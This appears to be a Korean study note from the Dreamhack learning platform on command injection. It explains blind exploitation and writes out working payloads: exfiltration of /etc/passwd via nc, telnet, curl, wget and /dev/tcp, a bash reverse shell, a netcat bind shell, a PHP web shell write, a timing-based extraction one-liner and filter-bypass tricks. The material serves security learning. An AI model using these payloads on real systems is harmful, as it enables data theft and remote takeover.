## [Dreamhack] Command injection 기초 공부

### Command injection이란
* Command injection 취약점: 이용자의 입력을 시스템 명령어로 실행하게 하는 취약점
* 명령어를 실행하는 함수에 이용자가 임의의 명령어를 전달 가능할 때 발생
* 이용자의 명령어를 적절히 필터링 해야 막을 수 있음
* 다양한 메타 문자('', $(), &&, ||, ;) 사용을 통해 명령어를 전달

### Command injection 주요 공격 방법(ExploitTech)
#### [Command injeciton이 발생하지만 실행결과를 알 수 없는 경우 1]

- 1. Network outbound
* 삽입 할 명령줄에 공격과 네트워크 명령어를 함께 삽입하여 공격하는 방식, 네트워크 도구가 설치되어 있거나 설치 가능할 때 사용 가능

- 1.1. nc(netcat): TCP 또는 UDP가 사용 가능한 네트워크에서 데이터를 송신하거나 수신하는 프로그램 
* => 파이프를 통해 네트워크 내용 전달 가능
* => ex) /etc/passwd | nc 127.0.0.1 8000

- 1.2. telnet: 네트워크 연결에 사용되는 프로토콜로 클라이언트를 설치해 네트워크에 연결 가능
* => ex) /etc/passwd | telnet 127.0.0.1 8000

* 1.3. curl, wget: 웹 서버의 컨텐츠를 가져오는 프로그램
* curl ex) curl "http:/127.0.0.1:8000/?$(ls -al | base64 -w0)"
* => 명령어의 중간중간 개행(\n)이 들어가 있기 때문에, base64 인코딩 할 때 -w0(줄바꿈 간격을 0으로 설정)해야 함
* curl ex) curl http:/127.0.0.1:8000 -d "$(ls -al)"
* wget ex) wget http:/127.0.0.1:8000 --method=POST --body-data="'ls -al'"

* dev/tcp udp: bash에서 지원하는 기능을 통해 전송
* ex => cat /etc/passwd > /dev/tcp/127.0.0.1/8080

- 2. Reverse & Bind shell
- 2.1. sh & bash 리버스 쉘
* /bin/sh -i >& /dev/tcp/127.0.0.1/8080 0>&1
* =>풀어 쓰면 /bin/sh -i 1> /dev/tcp/127.0.0.1/8080 2>&1 0>&1 
* => /bin/sh -i를 실행 시킨 후에 127.0.0.1:8080에 출력 파이프를 연결하고 에러 파이프와 입력 파이프 모두 출력 파이프와 동일한 곳에 연결

* [파일 디스트럭터]
* 0 입구(수신부, 키보드) 1 출구(결과 출력부, 모니터) 2 출구(에러 출력부, 모니터)를 나타내며 각 숫자는 '창구'또는 '파이프' 의미한다
* 즉 2>&1은 2번 출력 창구(파이프)를 뽑아다가 1번 창구랑 같은 곳에 꽂기 즉, 에러메세지도 같은 모니터(1번 창구)에 출력한다를 의미한다.
* >&의 경우 A 1> 소켓 2>&1을 축약한 것으로 모니터에 꽂혀있던 1번 출력 파이프를 소켓(웹 서버)에 꽂고 에러 파이프도 똑같은 곳에 꽂는 것을 의미한다. 

* 즉 이 과정은 Command_injection 취약점이 있는 웹 사이트에 /bin/sh -i >& /dev/tcp/127.0.0.1/8080 0>&1를 올려 피해자 컴퓨터가 실행하게 하고 공격자가 127.0.0.1:8080에 연결을 하게 되면 공격자 쉘에서의 입력이 피해자 쉘에서 실행되고 피해자 쉘에서의 출력이 모두 공격자 쉘에서 출력되게 된다.  => 리버스 쉘

- 2.2. 언어를 이용한 리버스 쉘
* 파이썬, 자바, 루비, C 등등 다양한 언어로 리버스 쉘을 실행 가능하다.

- 2.3. 리버스 쉘을 연결한 후 동작
* 연결을 하기 전 nc -nlvp 8080(임의 포트)로 열어 놓고 리버스 쉘 피해자 서버에서 실행 후 공격자 쉘에서 명령을 입력하면 피해자 쉘에서 그대로 실행

- 2.4 bind shell
* 특정 포트에 쉘을 올려 열어 놓아 그 포트에 접속해서 쉘을 이용하는 방식
* nc -nlvp 8080 -e(특정 포트에 임의 서비스를 등록하는 옵션) /bin/sh 을 연 후 공격자가 해당 포트에 접속 
* 보통 인바운드(바깥에서 안으로 오는 낯선 접속)은 철저하게 막혀있기 때문에 이 방식보다 아웃바운드 방식인 리버스 쉘을 많이 이용
* pearl도 사용 가능

- 3. 파일 생성
- 3.1. scipt engine
* 커맨드 인젝션 취약점 발생 + 웹 서버가 지정한 경로를 앎 
* ex) printf '<?=system($_GET[0])?>' > /var/www/html/uploads/shell.php 쉘을 가져오는 명령어를 지정한 경로에 업로드

- 3.2. static file directory
* flask같은 웹페이지들은 static을 가지고 있음
* static이 없어도 파일 생성 권한이 있을 경우에 static 폴더를 생성하여 파일을 업로드

* => 위의 모든 방법들은 인/아웃 바운드에 제약이 없을 경우에 사용

#### [Command injeciton이 발생하지만 실행결과를 알 수 없는 경우 2]

- 1. 지연시간
* ex) bash -c "a=\$(id | base64 -w 0); if [ \${a:0:1} == 'd' ]; then sleep 2; fi;"
* => 쉘에서 id 의 첫번째 글자를 base64로 인코딩 한 문자가 d이면 2초 쉬어라 => 명령어의 실행 결과를 시간으로 알아내기


- 2. 에러 이용
* => 시간차이를 이용하기 힘들거나 막힌 경우에는 cat /dev/urandom 같은 방법으로 오류 유발

#### [입력 길이가 제한된 경우]
- 리다이렉션을 통한 길이 조절
- (ip) long타입 인코딩을 통한 길이 조절

#### [입력 문자가 제한된 경우]
- 공백 문자 우회: 와일드 카드(?,* 등), 공백''"", \
- 키워드 필터링 우회: 정의되지 않은 변수 ${SDADSADSA}, 16진수화, base64 인코딩 이용
